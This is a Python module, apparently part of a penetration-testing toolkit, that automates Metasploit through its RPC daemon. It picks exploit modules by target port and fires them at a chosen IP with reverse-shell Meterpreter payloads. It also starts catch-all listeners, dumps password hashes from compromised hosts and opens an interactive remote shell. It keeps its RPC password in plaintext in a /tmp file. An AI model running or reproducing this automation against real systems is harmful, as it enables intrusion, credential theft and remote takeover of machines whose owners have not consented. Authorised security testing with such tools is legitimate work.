import os
import sys
import time
import subprocess
import socket
import string
import random
import atexit
import json
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    pass

console = Console()

# Path to persist the daemon password and port across Davoid sessions
MSF_LOCK_FILE = "/tmp/.davoid_msf.lock"


class MetasploitRPCEngine:
    def __init__(self):
        self.client = None
        self.daemon_process = None
        self.rpc_port = 55554
        self.msfrpcd_path = self.find_msfrpcd()

        # Try to load a previously saved password from a running daemon.
        # If none exists, generate a fresh one and persist it.
        self.password = self._load_or_create_password()

        # Register cleanup as a hard-exit safety net
        atexit.register(self.cleanup)

    # =========================================================================
    # LOCK FILE MANAGEMENT — Enables daemon reattachment across sessions
    # =========================================================================

    def _load_or_create_password(self):
        """Loads a persisted RPC password from the lock file, or generates a new one."""
        if os.path.exists(MSF_LOCK_FILE):
            try:
                with open(MSF_LOCK_FILE, "r") as f:
                    data = json.load(f)
                    saved_password = data.get("password")
                    saved_port = data.get("port", self.rpc_port)
                    if saved_password:
                        self.rpc_port = saved_port
                        console.print(
                            "[dim][*] Found existing MSF daemon lock file. Will attempt reattach.[/dim]")
                        return saved_password
            except Exception:
                pass

        new_password = ''.join(random.choices(
            string.ascii_letters + string.digits, k=16))
        self._save_lock_file(new_password)
        return new_password

    def _save_lock_file(self, password):
        """Persists the RPC password and port to disk for session reattachment."""
        try:
            with open(MSF_LOCK_FILE, "w") as f:
                json.dump({"password": password, "port": self.rpc_port}, f)
        except Exception as e:
            console.print(
                f"[yellow][!] Could not write MSF lock file: {e}[/yellow]")

    def _delete_lock_file(self):
        """Removes the lock file when the daemon is intentionally shut down."""
        if os.path.exists(MSF_LOCK_FILE):
            try:
                os.remove(MSF_LOCK_FILE)
            except Exception:
                pass

    # =========================================================================
    # SYSTEM / DAEMON MANAGEMENT
    # =========================================================================

    def find_msfrpcd(self):
        """Locates the msfrpcd executable on the system, bypassing sudo PATH issues."""
        common_paths = [
            "/opt/metasploit-framework/bin/msfrpcd",  # Official installer
            "/opt/homebrew/bin/msfrpcd",              # Apple Silicon Mac
            "/usr/local/bin/msfrpcd",                 # Intel Mac
            "/usr/bin/msfrpcd"                        # Kali / Parrot Linux
        ]

        try:
            path = subprocess.run(
                ['which', 'msfrpcd'], capture_output=True, text=True).stdout.strip()
            if os.path.exists(path):
                return path
        except Exception:
            pass

        for p in common_paths:
            if os.path.exists(p):
                return p

        return None

    def check_dependencies(self):
        """Verifies pymetasploit3 is installed and msfrpcd is available on the system."""
        try:
            import pymetasploit3
        except ImportError:
            console.print(
                "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
            console.print(
                "[yellow]    Run: pip install pymetasploit3[/yellow]")
            return False

        if not self.msfrpcd_path:
            console.print(
                "[bold red][!] Metasploit Framework ('msfrpcd') not found on this system![/bold red]")
            console.print(
                "[yellow]    Please ensure Metasploit is installed and accessible in PATH.[/yellow]")
            return False

        return True

    def is_port_open(self, port):
        """Checks if a local TCP port is currently listening."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            return s.connect_ex(('127.0.0.1', port)) == 0

    def kill_stuck_daemon(self):
        """Cross-platform method to forcefully free the RPC port."""
        if sys.platform == "darwin":  # macOS
            os.system(
                f"lsof -ti:{self.rpc_port} | xargs kill -9 > /dev/null 2>&1")
        else:  # Linux / Parrot / Kali
            os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")

    def start_daemon(self):
        """Silently boots the Metasploit RPC server in the background."""
        # Only kill and respawn if nothing is listening yet
        if self.is_port_open(self.rpc_port):
            console.print(
                "[dim][*] Port already open — skipping daemon spawn.[/dim]")
            return True

        with console.status(
            "[bold cyan]Booting Headless Metasploit Engine (This takes ~10-15 seconds)...[/bold cyan]",
            spinner="bouncingBar"
        ):
            cmd = [
                self.msfrpcd_path, "-P", self.password,
                "-n", "-f", "-a", "127.0.0.1",
                "-p", str(self.rpc_port)
            ]
            self.daemon_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Poll until the daemon finishes loading the Ruby framework
            for _ in range(40):
                if self.is_port_open(self.rpc_port):
                    # Give it a 3-second buffer to finalize module loading
                    time.sleep(3)
                    return True
                time.sleep(1)

        return False

    def connect_rpc(self):
        """
        Connects Davoid to an MSF Daemon.
        First attempts to reattach to an already-running daemon using the persisted password.
        If that fails, kills the old daemon and spawns a fresh one.
        """
        if self.client:
            return True

        # Step 1: Try reattaching to an existing daemon
        if self.is_port_open(self.rpc_port):
            console.print(
                "[*] Detected existing daemon on port — attempting reattach...")
            try:
                self.client = MsfRpcClient(
                    self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
                console.print(
                    "[bold green][+] Reattached to existing MSF Daemon successfully![/bold green]")
                time.sleep(0.5)
                return True
            except Exception as e:
                console.print(
                    f"[yellow][!] Reattach failed ({e}). Killing old daemon and spawning fresh...[/yellow]")
                self.kill_stuck_daemon()
                time.sleep(1)
                # Generate a new password since we are spawning fresh
                self.password = ''.join(random.choices(
                    string.ascii_letters + string.digits, k=16))
                self._save_lock_file(self.password)

        # Step 2: Spawn a fresh daemon with the current password
        if not self.start_daemon():
            console.print(
                "[bold red][!] Failed to boot Metasploit Daemon. Ensure Metasploit is installed correctly.[/bold red]")
            return False

        console.print("[*] Negotiating API connection...")
        try:
            self.client = MsfRpcClient(
                self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
            console.print(
                "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
            time.sleep(1)
            return True
        except Exception as e:
            console.print(
                f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
            return False

    # =========================================================================
    # CONSOLE OUTPUT HELPERS
    # =========================================================================

    def read_console_until_done(self, msf_console, timeout=45, break_on=None):
        """
        Polls the MSF virtual console until the busy flag clears or the timeout is reached.
        Optionally breaks early when any string in break_on is found in the output.
        Replaces all fixed sleep-based polling for reliable output capture.
        """
        output = ""
        start = time.time()
        default_breaks = [
            "Exploit completed", "session opened", "Command shell session",
            "Meterpreter session", "failed", "Error:", "No session was created",
            "exploit completed but no session", "unreachable"
        ]
        break_signals = break_on if break_on else default_breaks

        while time.time() - start < timeout:
            result = msf_console.read()

            if result and result.get('data'):
                chunk = result['data']
                output += chunk
                # Early exit on definitive terminal output
                if any(sig.lower() in chunk.lower() for sig in break_signals):
                    # Drain one more read to catch any trailing lines
                    time.sleep(0.5)
                    final = msf_console.read()
                    if final and final.get('data'):
                        output += final['data']
                    break

            # Stop polling once the MSF console reports it is no longer busy
            if not result.get('busy', True):
                break

            time.sleep(0.5)

        return output

    def destroy_console(self, msf_console):
        """Safely destroys a virtual console handle to prevent MSF console leaks."""
        if msf_console:
            try:
                msf_console.destroy()
            except Exception:
                pass

    # =========================================================================
    # FEATURE: MODULE SEARCH
    # =========================================================================

    def search_modules(self):
        """Searches the Metasploit database directly from within Davoid."""
        keyword = questionary.text(
            "Enter search keyword (e.g., vsftpd, eternalblue, smb, apache):",
            style=Q_STYLE
        ).ask()
        if not keyword:
            return

        msf_console = None
        try:
            msf_console = self.client.consoles.console()

            with console.status(
                f"[bold cyan]Querying Metasploit Database for '{keyword}'...[/bold cyan]",
                spinner="dots"
            ):
                msf_console.write(f"search {keyword}\n")
                raw_data = self.read_console_until_done(
                    msf_console, timeout=30, break_on=["msf6 >", "msf >"])

            if raw_data.strip():
                lines = raw_data.split('\n')
                # Filter to only show meaningful result lines
                filtered = [l for l in lines if "exploit/" in l or "auxiliary/" in l
                            or "post/" in l or "Name" in l or "----" in l or "====" in l]

                if len(filtered) > 60:
                    filtered = filtered[:60]
                    filtered.append(
                        "\n[dim]... Truncated. Refine your search for more specific results.[/dim]")

                display_text = '\n'.join(
                    filtered) if filtered else raw_data[:3000]
                console.print(Panel(
                    display_text,
                    title=f"[cyan]Search Results: {keyword}[/cyan]",
                    border_style="cyan"
                ))
            else:
                console.print(
                    f"[yellow][!] No modules found for '{keyword}' or search timed out.[/yellow]")

        except Exception as e:
            console.print(f"[red][!] Search failed: {e}[/red]")
        finally:
            self.destroy_console(msf_console)

    # =========================================================================
    # FEATURE: AUTO-EXPLOIT WITH LIVE DB RANKING
    # =========================================================================

    def auto_exploit(self):
        """
        Queries the live MSF database for exploits matching the target port,
        ranks them by reliability, and lets the user pick from a smart dropdown.
        """
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"
        default_lport = ctx.get("LPORT") or "4444"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        rport_input = questionary.text(
            "Target Port (RPORT):", style=Q_STYLE).ask()
        if not rport_input:
            return

        # Safe RPORT parse — no crash on bad input
        try:
            rport = int(rport_input)
        except ValueError:
            console.print(
                "[bold red][!] Invalid port number. Please enter a numeric value.[/bold red]")
            return

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
        if not lhost:
            return

        lport_input = questionary.text(
            "Your Port (LPORT):", default=default_lport, style=Q_STYLE).ask()
        if not lport_input:
            return

        # Safe LPORT parse
        try:
            lport = int(lport_input)
        except ValueError:
            console.print(
                "[bold red][!] Invalid LPORT. Please enter a numeric value.[/bold red]")
            return

        # Persist updated values to ctx so next run auto-fills them
        ctx.set("RHOST", target)
        ctx.set("LHOST", lhost)
        ctx.set("LPORT", str(lport))

        # --- DYNAMIC INTELLIGENCE ENGINE: Query MSF DB ranked by reliability ---
        rank_scores = {
            "excellent": 7, "great": 6, "good": 5,
            "normal": 4, "average": 3, "low": 2, "manual": 1
        }
        parsed_modules = []
        raw_data = ""

        search_console = None
        try:
            search_console = self.client.consoles.console()

            with console.status(
                f"[bold cyan]Querying MSF Database & Ranking Exploits for Port {rport}...[/bold cyan]",
                spinner="dots"
            ):
                search_console.write(f"search port:{rport} type:exploit\n")
                raw_data = self.read_console_until_done(
                    search_console, timeout=30, break_on=["msf6 >", "msf >"])

        except Exception as e:
            console.print(f"[dim red][!] Module search error: {e}[/dim red]")
        finally:
            self.destroy_console(search_console)

        if raw_data:
            display_lines = []
            for line in raw_data.splitlines():
                # Collect header lines and actual exploit module result lines
                if "Name" in line and "Disclosure" in line:
                    display_lines.append(line)
                elif "----" in line or "====" in line:
                    display_lines.append(line)
                elif "exploit/" in line:
                    display_lines.append(line)

                    # Extract module path and rank score for sorting
                    parts = line.split()
                    mod_path = next(
                        (p for p in parts if p.startswith("exploit/")), None)
                    rank = next((r for r in rank_scores.keys()
                                if r in line.lower()), "normal")

                    if mod_path:
                        parsed_modules.append({
                            'path': mod_path,
                            'rank': rank,
                            'score': rank_scores[rank]
                        })

            if parsed_modules:
                console.print(Panel(
                    "\n".join(display_lines[:30]),
                    title=f"[green]Top Vulnerabilities for Port {rport}[/green]",
                    border_style="green"
                ))
                if len(display_lines) > 30:
                    console.print(
                        "[dim]... [Truncated. Showing top results only] ...[/dim]")
            else:
                console.print(
                    f"[yellow][-] No port-matched exploits found for port {rport} in the MSF Database.[/yellow]")

        # --- SMART DROPDOWN: Sorted by reliability score, highest first ---
        custom_mod = ""
        if parsed_modules:
            parsed_modules.sort(key=lambda x: x['score'], reverse=True)

            # Format choices with rank badge prefix for clarity
            choices = [
                f"[{m['rank'].upper()}] {m['path']}" for m in parsed_modules[:15]]
            choices.append(questionary.Separator())
            choices.append("Manual Entry (Type it yourself)")

            selected = questionary.select(
                "Select Exploit Module (Sorted by Reliability):",
                choices=choices,
                style=Q_STYLE
            ).ask()

            if not selected:
                return
            elif selected == "Manual Entry (Type it yourself)":
                custom_mod = questionary.text(
                    "Enter Exploit Module path (e.g., exploit/unix/ftp/vsftpd_234_backdoor):",
                    style=Q_STYLE
                ).ask()
            else:
                # Strip the "[EXCELLENT] " badge to get the pure module path
                custom_mod = selected.split("] ", 1)[-1].strip()
        else:
            custom_mod = questionary.text(
                "Enter Exploit Module manually (e.g., exploit/unix/ftp/vsftpd_234_backdoor):",
                style=Q_STYLE
            ).ask()

        if not custom_mod:
            return

        # Smart default payload guess based on the chosen module name
        default_payload = "windows/x64/meterpreter/reverse_tcp"
        if any(k in custom_mod for k in ["unix", "linux", "apache", "vsftpd", "ftp"]):
            default_payload = "cmd/unix/interact"
        elif "php" in custom_mod:
            default_payload = "php/meterpreter/reverse_tcp"
        elif "java" in custom_mod or "tomcat" in custom_mod:
            default_payload = "java/jsp_shell_reverse_tcp"

        payload_choices = [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "cmd/unix/interact",
            "php/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "osx/x64/meterpreter_reverse_tcp",
            questionary.Separator(),
            "Custom (Type it manually)"
        ]

        custom_payload = questionary.select(
            "Select Payload:",
            choices=payload_choices,
            default=default_payload if default_payload in payload_choices else None,
            style=Q_STYLE
        ).ask()

        if custom_payload == "Custom (Type it manually)":
            custom_payload = questionary.text(
                "Enter exact MSF Payload path:", default=default_payload, style=Q_STYLE).ask()

        if not custom_payload:
            return

        console.print(Panel(
            f"[bold cyan]Deploying Exploit via Virtual Console API...[/bold cyan]\n"
            f"[white]Target :[/white] {target}:{rport}\n"
            f"[white]Module  :[/white] {custom_mod}\n"
            f"[white]Payload :[/white] {custom_payload}\n"
            f"[white]LHOST   :[/white] {lhost}:{lport}",
            border_style="red"
        ))

        exploit_console = None
        try:
            exploit_console = self.client.consoles.console()

            exploit_console.write(f"use {custom_mod}\n")
            time.sleep(0.5)

            # Use setg (Set Global) so variables persist across console restarts in this session
            exploit_console.write(f"setg RHOSTS {target}\n")
            exploit_console.write(f"setg RHOST {target}\n")
            exploit_console.write(f"setg RPORT {rport}\n")
            exploit_console.write(f"setg LHOST {lhost}\n")
            exploit_console.write(f"setg LPORT {lport}\n")
            exploit_console.write(f"set PAYLOAD {custom_payload}\n")

            # ConnectTimeout increase helps the vsftpd backdoor and similar slow exploits
            exploit_console.write("set ConnectTimeout 30\n")
            exploit_console.write("set WfsDelay 10\n")

            # Smart LPE detection: Local exploits need an existing session
            if "local" in custom_mod or "pe_injection" in custom_mod:
                console.print(
                    "\n[yellow][!] This appears to be a Local Privilege Escalation exploit.[/yellow]")
                sess_id = questionary.text(
                    "Enter the active SESSION ID to upgrade:", style=Q_STYLE).ask()
                if sess_id:
                    exploit_console.write(f"set SESSION {sess_id}\n")

            # -z backgrounds the session cleanly to prevent dropped connections
            exploit_console.write("exploit -z\n")

            db.log("MSF-Engine", target,
                   f"Attempted {custom_mod} via Console", "INFO")

            # Capture live output using the smart polling reader
            console_output = ""
            with console.status(
                "[bold cyan]Executing exploit and capturing MSF output...[/bold cyan]",
                spinner="dots"
            ):
                console_output = self.read_console_until_done(
                    exploit_console, timeout=60)

            if console_output.strip():
                console.print(f"\n[dim]{console_output.strip()}[/dim]")

            # Poll for sessions — check up to 4 times with 2s intervals
            with console.status(
                "[bold cyan]Verifying session status...[/bold cyan]",
                spinner="bouncingBar"
            ):
                session_found = False
                for _ in range(4):
                    time.sleep(2)
                    sessions = self.client.sessions.list
                    if sessions:
                        console.print(
                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. "
                            f"Use 'Active Sessions' to interact.[/bold green]"
                        )

                        # Log full session details for engagement reporting
                        for sid, sdata in sessions.items():
                            db.log(
                                "MSF-Engine",
                                sdata.get('target_host', target),
                                f"Session {sid} | Type: {sdata.get('type', 'unknown')} | "
                                f"Arch: {sdata.get('arch', 'unknown')} | "
                                f"Info: {sdata.get('info', 'N/A')} | "
                                f"Module: {custom_mod}",
                                "CRITICAL"
                            )

                        db.log("MSF-Engine", target,
                               f"Successful Exploit: {custom_mod}", "CRITICAL")
                        session_found = True
                        break

                if not session_found:
                    console.print(
                        "\n[yellow][-] No session established yet. "
                        "The exploit may have failed, target isn't vulnerable, "
                        "or it needs more time.[/yellow]"
                    )

        except KeyboardInterrupt:
            console.print(
                "\n[yellow][*] Exploit interrupted by user.[/yellow]")

        except Exception as e:
            console.print(
                f"[bold red][!] Exploit execution failed:[/bold red] {e}")

        finally:
            # Always destroy the console to prevent MSF handle leaks
            self.destroy_console(exploit_console)

    # =========================================================================
    # FEATURE: SESSION MANAGEMENT
    # =========================================================================

    def list_sessions(self):
        """Pulls live session data from the Metasploit Daemon and logs it to db."""
        sessions = self.client.sessions.list

        if not sessions:
            console.print("[yellow][!] No active MSF sessions found.[/yellow]")
            return False

        table = Table(title="Active MSF Sessions (RPC)",
                      border_style="green", expand=True)
        table.add_column("ID", style="cyan", justify="center")
        table.add_column("Type", style="magenta")
        table.add_column("Target IP", style="white")
        table.add_column("Arch", style="yellow")
        table.add_column("Details", style="dim")

        for session_id, data in sessions.items():
            table.add_row(
                str(session_id),
                data.get('type', 'Unknown'),
                data.get('target_host', 'Unknown'),
                data.get('arch', 'Unknown'),
                data.get('info', 'No Info')
            )

            # Log session data on every view for reporting purposes
            db.log(
                "MSF-Sessions",
                data.get('target_host', 'Unknown'),
                f"Session {session_id} | Type: {data.get('type', 'unknown')} | "
                f"Arch: {data.get('arch', 'unknown')} | Info: {data.get('info', 'N/A')}",
                "INFO"
            )

        console.print(table)
        return True

    def interact_session(self):
        """Opens an interactive post-exploitation terminal to an active Metasploit session."""
        if not self.list_sessions():
            return

        session_id = questionary.text(
            "Enter Session ID to interact with (or leave blank to cancel):",
            style=Q_STYLE
        ).ask()

        if not session_id:
            return

        sessions = self.client.sessions.list

        # Normalize keys to strings — MSF returns mixed int/str keys depending on version
        normalized_sessions = {str(k): v for k, v in sessions.items()}
        session_id = str(session_id)

        if session_id not in normalized_sessions:
            console.print("[bold red][!] Invalid Session ID.[/bold red]")
            return

        session_type = normalized_sessions[session_id].get('type', 'Unknown')
        shell = self.client.sessions.session(session_id)

        # Post-Exploitation Quick Actions for Meterpreter sessions
        if session_type == 'meterpreter':
            quick_action = questionary.select(
                "Meterpreter Quick Actions:",
                choices=[
                    "1. Drop into Interactive Shell",
                    "2. Run 'sysinfo' and 'getuid'",
                    "3. Attempt Hashdump",
                    "4. List Running Processes (ps)"
                ],
                style=Q_STYLE
            ).ask()

            if quick_action and "sysinfo" in quick_action:
                console.print("[cyan][*] Gathering system info...[/cyan]")
                sysinfo_out = shell.run_with_output('sysinfo')
                getuid_out = shell.run_with_output('getuid')
                if sysinfo_out:
                    console.print(f"[white]{sysinfo_out}[/white]")
                if getuid_out:
                    console.print(f"[white]{getuid_out}[/white]")
            elif quick_action and "Hashdump" in quick_action:
                console.print(
                    "[cyan][*] Attempting to dump password hashes...[/cyan]")
                hashdump_out = shell.run_with_output('hashdump')
                if hashdump_out:
                    console.print(f"[bold yellow]{hashdump_out}[/bold yellow]")
                    db.log("MSF-PostEx", normalized_sessions[session_id].get('target_host', 'Unknown'),
                           f"Hashdump via Session {session_id}", "CRITICAL")
            elif quick_action and "ps" in quick_action:
                console.print("[cyan][*] Listing processes...[/cyan]")
                ps_out = shell.run_with_output('ps')
                if ps_out:
                    console.print(f"[white]{ps_out}[/white]")

        console.print(Panel(
            f"[bold green][+] Interacting with {session_type.capitalize()} Session {session_id}[/bold green]\n"
            f"[dim]Type 'exit', 'quit', or 'background' to return to Davoid.[/dim]",
            border_style="green"
        ))

        while True:
            try:
                cmd = questionary.text(
                    f"{session_type.capitalize()} {session_id} >",
                    style=Q_STYLE
                ).ask()

                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit', 'background']:
                    break

                # Meterpreter and standard shells use different execution APIs in pymetasploit3
                if session_type == 'meterpreter':
                    output = shell.run_with_output(cmd)
                    if output:
                        console.print(f"[white]{output}[/white]")
                else:
                    shell.write(cmd + '\n')
                    # Buffer time for the remote shell to process
                    time.sleep(1.5)
                    output = shell.read()
                    if output:
                        console.print(f"[white]{output}[/white]")

            except KeyboardInterrupt:
                console.print(
                    "\n[yellow][*] Backgrounding session...[/yellow]")
                break
            except Exception as e:
                console.print(
                    f"[bold red][!] Error interacting with session:[/bold red] {e}")
                break

    # =========================================================================
    # FEATURE: BACKGROUND JOB MANAGER
    # =========================================================================

    def manage_jobs(self):
        """Lists all active background MSF jobs and allows targeted termination."""
        jobs = self.client.jobs.list

        if not jobs:
            console.print(
                "[yellow][!] No background jobs currently running.[/yellow]")
            return

        table = Table(title="Active MSF Background Jobs",
                      border_style="blue", expand=True)
        table.add_column("Job ID", style="cyan", justify="center")
        table.add_column("Job Name", style="white")

        for jid, jname in jobs.items():
            table.add_row(str(jid), str(jname))

        console.print(table)

        target_job = questionary.text(
            "Enter Job ID to kill (or leave blank to cancel):",
            style=Q_STYLE
        ).ask()

        if not target_job:
            return

        if str(target_job) not in {str(k) for k in jobs.keys()}:
            console.print("[bold red][!] Invalid Job ID.[/bold red]")
            return

        try:
            self.client.jobs.stop(str(target_job))
            console.print(
                f"[bold green][+] Job {target_job} terminated successfully.[/bold green]")
            db.log("MSF-Jobs", "localhost",
                   f"Killed background job {target_job}", "INFO")
        except Exception as e:
            console.print(f"[red][!] Failed to kill job: {e}[/red]")

    # =========================================================================
    # CLEANUP
    # =========================================================================

    def cleanup(self):
        """
        Kills the background daemon on exit.
        Only deletes the lock file if we spawned the daemon — reattached
        sessions leave the lock intact so future runs can reattach cleanly.
        """
        if self.daemon_process:
            console.print(
                "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
            self.daemon_process.terminate()
            self.kill_stuck_daemon()  # Ensure it is completely dead
            self._delete_lock_file()  # Clean up since we own this daemon
        # If we reattached (daemon_process is None), leave the daemon and lock file running

    # =========================================================================
    # MAIN MENU
    # =========================================================================

    def run(self):
        draw_header("Metasploit RPC Orchestrator")

        if not self.check_dependencies():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect_rpc():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        try:
            while True:
                choice = questionary.select(
                    "MSF-RPC Operations:",
                    choices=[
                        "1. Auto-Exploit Target",
                        "2. Search MSF Modules (Exploit Database)",
                        "3. Start Generic Catch-All Listener (Multi/Handler)",
                        "4. Active Sessions & Post-Exploitation",
                        "5. Manage Background Jobs",
                        "Back"
                    ],
                    style=Q_STYLE
                ).ask()

                if not choice or choice == "Back":
                    break

                elif "Auto-Exploit" in choice:
                    self.auto_exploit()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

                elif "Search MSF" in choice:
                    self.search_modules()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

                elif "Active Sessions" in choice:
                    self.interact_session()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

                elif "Manage Background" in choice:
                    self.manage_jobs()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

                elif "Listener" in choice:
                    default_lhost = ctx.get("LHOST") or "0.0.0.0"
                    default_lport = ctx.get("LPORT") or "4444"

                    lhost = questionary.text(
                        "LHOST:", default=default_lhost, style=Q_STYLE).ask()
                    if not lhost:
                        continue

                    lport = questionary.text(
                        "LPORT:", default=default_lport, style=Q_STYLE).ask()
                    if not lport:
                        continue

                    # Safe LPORT parse — no crash on bad input
                    try:
                        lport_int = int(lport)
                    except ValueError:
                        console.print(
                            "[bold red][!] Invalid LPORT. Please enter a numeric value.[/bold red]")
                        questionary.press_any_key_to_continue(
                            style=Q_STYLE).ask()
                        continue

                    # Persist to ctx
                    ctx.set("LHOST", lhost)
                    ctx.set("LPORT", str(lport_int))

                    payload_choices = [
                        "windows/x64/meterpreter/reverse_tcp",
                        "windows/meterpreter/reverse_tcp",
                        "linux/x64/meterpreter/reverse_tcp",
                        "linux/x86/meterpreter/reverse_tcp",
                        "cmd/unix/interact",
                        "php/meterpreter/reverse_tcp",
                        questionary.Separator(),
                        "Custom (Type it manually)"
                    ]

                    payload = questionary.select(
                        "Select Payload for Listener:",
                        choices=payload_choices,
                        style=Q_STYLE
                    ).ask()

                    if payload == "Custom (Type it manually)":
                        payload = questionary.text(
                            "Enter exact MSF Payload path:",
                            default="windows/x64/meterpreter/reverse_tcp",
                            style=Q_STYLE
                        ).ask()

                    if not payload:
                        continue

                    listener_console = None
                    try:
                        listener_console = self.client.consoles.console()
                        listener_console.write("use exploit/multi/handler\n")
                        listener_console.write(f"set PAYLOAD {payload}\n")
                        listener_console.write(f"setg LHOST {lhost}\n")
                        listener_console.write(f"setg LPORT {lport_int}\n")
                        listener_console.write("exploit -j -z\n")

                        console.print(
                            f"[bold green][+] Listener started in background on {lhost}:{lport_int} "
                            f"(Check 'Manage Background Jobs' to monitor).[/bold green]"
                        )

                        # Drain initial output with smart poller
                        output_data = self.read_console_until_done(
                            listener_console, timeout=10,
                            break_on=["Started", "handler", "msf6 >"]
                        )
                        if output_data.strip():
                            console.print(
                                f"\n[dim]{output_data.strip()}[/dim]")

                        db.log("MSF-Engine", lhost,
                               f"Listener started on {lhost}:{lport_int} with {payload}", "INFO")

                    except Exception as e:
                        console.print(
                            f"[red][!] Failed to start listener: {e}[/red]")

                    finally:
                        # Always destroy the console to prevent MSF handle leaks
                        self.destroy_console(listener_console)

                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()

        except KeyboardInterrupt:
            console.print(
                "\n[yellow][*] Caught interrupt, cleaning up...[/yellow]")

        finally:
            self.cleanup()


def run_msf():
    engine = MetasploitRPCEngine()
    engine.run()


if __name__ == "__main__":
    run_msf()
